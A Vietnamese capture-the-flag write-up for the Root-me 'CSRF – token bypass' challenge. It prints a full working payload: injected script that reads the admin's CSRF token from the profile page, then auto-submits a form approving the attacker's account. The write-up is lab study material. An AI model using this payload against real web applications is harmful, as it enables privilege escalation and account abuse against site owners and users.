# Root-me
``capy3ra``

## CSRF – token bypass

1. Để lấy được flag trong action=private thì tài khoản của attacker phải được admin approved bằng cách tick checkbox ở action=profile.
2. Vector tấn công ở đây sẽ là action=contact khi mà gửi comment thì admin sẽ đọc comment. Và ta sẽ poisoning input đó.
3. Tuy nhiên ở đây, server triển khai csrf token. Do đó trước hết phải lấy được token của admin ở action=profile. Chúng ta có thể lấy được token đó bằng cách gửi một request đến action=profile với admin session khi mà ta lừa admin đọc comment mà ta gửi kèm với payload. 
```
var request = new XMLHttpRequest();
request.open("GET", decodeURIComponent("http://challenge01.root-me.org/web-client/ch23/?action=profile"), false);
request.send(null); 
var respone = request.responseText; 
var groups = respone.match("token\" value=\"(.*?)\""); 
var token = groups[1];
```

4. Sau đó tạo một form có checkbox có giá trị "on" với username account của attacker được tự động gửi. Dẫn đến account của attacker có thể được admin approved.
5. Toàn bộ Payload:
```
<form name="csrf" method="POST" action="http://challenge01.root-me.org/web-client/ch23/index.php?action=profile" enctype="multipart/form-data">
	<input id="username" type="text" name="username" value="cuong">
	<input id="status" type="checkbox" name="status" checked value="on">
	<input id="token" type="hidden" name="token" value= />
</form>

<script>
 	var request = new XMLHttpRequest();
 	request.open("GET", decodeURIComponent("http://challenge01.root-me.org/web-client/ch23/?action=profile"), false);
 	request.send(null); 
 	var respone = request.responseText; 
 	var groups = respone.match("token\" value=\"(.*?)\""); 
 	var token = groups[1];
	document.getElementById("token").value = token;
    document.csrf.submit();

</script>
```
6. Vào action=private lấy flag.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/b6eb6b27-cf83-4790-9ac6-c4e93463e4ac)

##
